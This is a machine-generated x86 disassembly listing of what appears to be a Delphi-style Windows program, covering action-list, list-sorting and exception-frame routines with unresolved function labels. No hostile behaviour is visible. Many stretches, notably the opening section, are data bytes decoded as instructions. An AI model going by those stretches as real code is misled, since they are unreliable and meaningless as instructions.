xor al 0x40
je r-xdata
outsd
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
adc [ eax ] al
enter 0x0 0xff
enter 0x43b5 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
or [ eax ] eax
or [ ecx + 0x74 ] ecx
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ ebx ] cl
dec eax
insb
jo r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
test [ edi + 0x41 ] bl
add [ eax + eax ] dh
dec [ eax ]
call [ ecx ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070004 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
in al 0x10
inc eax
add [ eax + eax ] ah
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
stosb [ edi ]
inc ebx
add [ eax + eax ] ch
add [ eax ] al
in al 0xa3
inc ebx
add [ esp + esi ] dh
inc eax
add [ eax ] al
stosd [ edi ]
inc ebx
add [ edi ] al
adc [ ebx + edx * 2 + 0x74 ] dl
popad
je r-xdata
cdq
inc ecx
add [ eax ] bh
sahf
insd
add [ eax - 0x5a ] ch
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax - 0x74ffbc5e ] ch
sar [ edx + ebp * 4 + 0x43 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
stosd [ edi ]
add [ eax + 0x34 ] al
inc eax
insd
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
insd
pop eax
inc ebx
jne r-xdata
js r-xdata
stosb [ edi ]
inc ebx
add al dl
add [ eax ] al
push [ ebx + edi * 4 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4905000a ] al
je r-xdata
jae r-xdata
outsd
outsb
je r-xdata
inc esi
add [ esi + edx + 0x42 ] ah
mov edx 0x20680043
arpl [ ecx + ebp * 2 + 0x73 ] cx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
scasd [ edi ]
inc ebx
add [ eax ] ch
add [ eax ] al
add [ edx + 0x34340045 ] al
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x1b ] cl
inc edx
add [ eax - 0x80 ] al
inc ebp
add [ ebx + ebx + 0x42 ] bh
add [ eax - 0x57ffbab7 ] dh
mov ebx 0x4a5c0043
inc ebp
add [ eax ] al
sbb eax [ edx ]
insd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
push esp
movsd [ edi ] [ esi ]
inc ebx
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000f ] al
outsb
dec ecx
sub al 0x17
inc esi
add [ eax ] cl
inc esi
add [ eax ] dh
inc esi
add [ esi + 0x46 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5312000c ] al
arpl [ gs : edi + 0x6e ] bp
popad
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
or eax 0x69560700
jae r-xdata
insd
js r-xdata
js r-xdata
add [ eax + 0x34 ] al
inc eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
inc esi
add [ eax ] dl
dec ecx
inc ebp
add [ eax ] cl
pop ds
inc esi
add [ eax + eax * 4 + 0x45 ] ah
add [ eax + 0x4400454a ] cl
dec ecx
inc ebp
add [ eax + 0x1f ] bl
inc esi
add [ edi + ebx + 0x46 ] ch
add [ ecx + ecx * 2 + 0x45 ] bh
add [ edi + ebx + 0x49d80046 ] dl
inc ebp
add [ edi + ebx + 0x49f80046 ] bl
inc ebp
add [ edi + ebx - 0x7f93ffba ] ah
inc ebp
add ah ch
dec edx
inc ebp
add [ ebx + ecx * 2 ] ch
inc ebp
add [ eax ] bl
dec edx
inc ebp
add [ eax - 0x43ffb9e1 ] bh
pop ds
inc esi
add [ edx + ecx * 2 ] bh
inc ebp
add [ edi + eax * 2 - 0x4497ffbb ] ch
inc ebx
add ah ch
mov ebx 0xbb7c0043
inc ebx
add [ eax - 0x44 ] bl
inc ebx
add al ah
mov ebp 0xbdb00043
inc ebx
add [ ebp + edi * 4 + 0x540f0043 ] dh
dec esp
imul esi [ ebx + 0x74 ] 0x69746341
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x51ec8b55
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
add [ ebx ] bl
inc edx
add [ ebx + ebx + 0x1be80042 ] dl
inc edx
add [ eax + ecx * 2 + 0x1ee00045 ] bl
popad
je r-xdata
pop ss
inc esi
add [ eax - 0x77010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060010 ] al
push ebx
push 0x4374726f
jne r-xdata
outsb
dec eax
imul ebp [ esi + 0x74 ] r-xdata
dec eax
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or [ edi + 0x6e ] cl
push ebp
jo r-xdata
add [ esi ] al
bound ebp [ ebp + 0xc ]
stosb [ edi ]
inc ebx
add al bl
add [ eax ] al
insd
dec ecx
outsb
pop edi
inc ecx
add [ eax + eax + 0x2470ff00 ] al
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
add eax 0x6d657449
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060008 ] al
insd
popad
in al 0x10
inc eax
add [ eax + eax ] bh
push [ ebx + 0x10046 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ eax + ecx * 2 ] al
imul ebp [ esi + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
add [ eax ] al
[ ebp + esi * 4 + 0x43 ]
add al bl
xchg ebx eax
inc ecx
add [ eax ] ch
mov ah 0x43
add [ eax - 0x27ffbde4 ] bl
sbb [ esi ] eax
xor al 0x25
inc esi
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ eax ] cl
mov edx 0x1d580043
inc edx
add ah bh
sbb al 0x42
add [ esp + esi * 4 ] ah
inc ebx
add al al
sbb al 0x42
add ah al
mov dl 0x43
add [ ebx + ebx ] ch
inc esi
add [ ebx + 0x46 ] bl
add ah dh
and al [ esi ]
mov [ esi ] ah
inc esi
add [ eax + 0x100043ba ] bl
mov ebx 0xbb440043
inc ebx
add [ eax ] cl
mov ebx 0x54110043
push ebx
je r-xdata
and [ esi ] al
push ss
inc edx
insd
jae r-xdata
xor edx edx
push ebp
push sub_43af9b
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ esi + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
xchg esp eax
sbb eax [ edx ]
call 0xffffffff9c43f0b4
dec eax
inc ebp
add al ah
push ds
nop
js r-xdata
dec edi
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
push es
jae r-xdata
add [ eax - 0x49 ] bl
inc ebx
add ah dh
popfd
inc ecx
add ah ch
mov eax 0x9a640043
inc ecx
add al ah
0xb0c00041 0x43
adc [ ebx + edx * 2 + 0x74 ] dl
popad
je r-xdata
stosb [ edi ]
inc ebx
add [ eax - 0x5c ] dh
inc ebx
add [ ebx ] al
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
retn
mov edx [ eax ]
call [ edx + 0x24 ]
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
xchg [ eax ] al
add bh bh
aam 0x24
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 4 + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
stosd [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
stosd [ edi ]
inc ebx
add al ah
add [ eax ] al
add [ eax + 0x5c0043a5 ] ch
sbb al [ edx ]
sub_43af20
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
xor edx edx
push ebp
push sub_43af9b
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ esi + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_43afb8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419730
mov [ esi + 0x18 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_43aff4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_40423c
test eax eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4197d4
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_403fd0
pop esi
pop ebx
retn
sub_43b054
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_43b1ec
push eax
mov edx esi
mov eax ebx
call sub_43b1ec
mov edx eax
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x28 ]
pop edi
pop esi
pop ebx
retn
sub_43b090
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1d ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_419b1c
dec eax
jle r-xdata
push esi
mov eax ebx
call sub_419b1c
mov ecx eax
dec ecx
xor edx edx
mov eax ebx
call sub_43b158
sub_43b0c0
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
pop ebx
retn
mov eax [ ecx + 0x10 ]
mov edx [ edx + 0x10 ]
xchg edx eax
call sub_40804c
mov eax [ ecx + 0x10 ]
mov edx [ edx + 0x10 ]
xchg edx eax
call sub_408014
jmp r-xdata
pop ebx
retn
sub_43b0fc
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43b1ec
mov ebp eax
mov edx edi
mov eax ebx
call sub_43b1ec
mov [ esp ] eax
mov edx esi
mov eax ebx
call sub_43b1ec
call sub_4197bc
mov esi eax
mov edx edi
mov eax ebx
call sub_43b1ec
call sub_4197bc
mov edx eax
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov edx esi
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43b158
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43b0fc
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43b158
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43b224
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_419e64
mov [ esi + 0x1c ] 0x0
mov [ esi + 0x1d ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_43b26c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_461fc4
mov [ esi + 0xc8 ] 0xffffffff
mov [ esi + 0x60 ] 0x0
mov dl 0x1
mov eax esi
call sub_46227c
mov dl 0x1
mov eax esi
call sub_43b45c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_43b2c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x1
xor eax eax
push ebp
push sub_43b3dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x0
retn
mov eax edi
mov edx [ r-xdata ]
call sub_40339c
mov ecx eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_418dc4
cmp edi [ eax + 0x20 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_418dc4
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_40339c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xcc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_418dc4
pop edx
mov ecx [ eax ]
call [ ecx + 0x8c ]
sub_43b3ec
push ebx
push ecx
mov [ esp ] 0xffffffff
cmp [ eax + 0xba ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_43b428
push ebx
mov ebx eax
mov eax ebx
call sub_42173c
mov al [ ebx + 0xa1 ]
test al al
je r-xdata
mov eax [ ebx + 0xac ]
test eax eax
je r-xdata
mov edx eax
mov eax ebx
call sub_43b45c
pop ebx
retn
mov edx eax
mov eax ebx
call sub_43b55c
sub_43b45c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0xa0 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0xa0 ] dl
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0xa1 ] dl
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
cmp eax 0xffffffff
je r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43b5c8
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x1
xor eax eax
push ebp
push sub_43b529
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_418dc4
mov dl [ ebp - 0x5 ]
mov ecx [ eax ]
call [ ecx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_418dc4
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
sub_43b55c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
test ebp ebp
je r-xdata
cmp ebp [ ebx + 0xa4 ]
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0xa4 ] ebp
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xac ] ebp
jmp r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418dc4
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x88 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418dc4
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
sub_43b5c8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xc8 ] ebp
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418dc4
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418dc4
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
sub_43b628
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
cmp [ esi + 0xd2 ] 0x0
setne bl
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0xd4 ]
call [ esi + 0xd0 ]
sub_43b678
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43b747
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
cmp esi eax
jge r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
jmp r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b74e
lea eax [ ebp - 0x18 ]
call sub_403f7c
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
sub_43b6c2
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b74e
lea eax [ ebp - 0x18 ]
call sub_403f7c
lea eax [ ebp - 0xc ]
call sub_403f7c
retn
sub_43b758
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
sub cl 0x1
jb r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
dec cl
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_40339c
mov eax [ eax + 0x28c ]
call sub_449644
mov ebx eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ esp ]
mov edx [ eax + 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc esi
xor ebp ebp
inc ebp
dec esi
jne r-xdata
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_443b74
mov ebx eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax ebx
call sub_443614
mov eax [ esp ]
mov ecx [ eax + 0x18 ]
xor edx edx
mov eax ebx
call sub_4437cc
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_4436c4
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ esp ]
call sub_4197bc
mov edx eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx ebp
call sub_418dc4
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov eax [ esp ]
call sub_4197bc
mov edx eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_4444cc
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx ebp
call sub_418dc4
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
sub_43b8ec
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_419df8
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
mov eax [ eax + 0x50 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
inc ebp
mov [ esp ] 0x0
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_40339c
mov esi eax
mov eax ebx
call sub_4197bc
mov edx eax
mov eax [ esi + 0x28c ]
call sub_43b1ec
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebx + 0x18 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebx + 0x14 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc [ esp ]
dec ebp
jne r-xdata
mov eax ebx
call sub_4197bc
mov edx eax
mov eax [ esi + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_443c00
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
call sub_443614
mov ecx [ ebx + 0x18 ]
xor edx edx
mov eax esi
call sub_4437cc
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4436c4
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx [ esp ]
call sub_418dc4
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
sub_43ba08
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43b26c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x60 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43b224
mov esi eax
mov [ ebx + 0xd0 ] esi
mov [ esi + 0x28 ] ebx
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
